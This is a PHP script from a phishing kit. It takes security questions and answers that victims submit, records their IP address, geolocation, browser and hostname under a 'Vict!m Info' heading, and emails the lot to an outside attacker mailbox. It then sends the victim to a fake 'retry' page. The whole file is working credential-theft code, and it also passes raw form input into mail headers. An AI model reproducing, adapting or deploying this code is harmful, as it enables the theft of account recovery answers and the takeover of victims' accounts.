<?php
require("race.php");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Qurstion:             : ".$_POST['q1']."\n";
$message .= "Answer:             : ".$_POST['a1']."\n";
$message .= "Qurstion:             : ".$_POST['q2']."\n";
$message .= "Answer:             : ".$_POST['a2']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Bon-------------\n";
$send = "noreply@yandex.com";
$subject = "Huntintintintin 4 ever $ip";
$headers = "From: Huntintintintin bithc  <kidkudi@sagadyge.com>";
$headers .= $_POST['bntionn']."\n";
$headers .= $_POST['shenio']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
	  header("Location: sane.html?otp&module=server94937=retry");

	 
?>
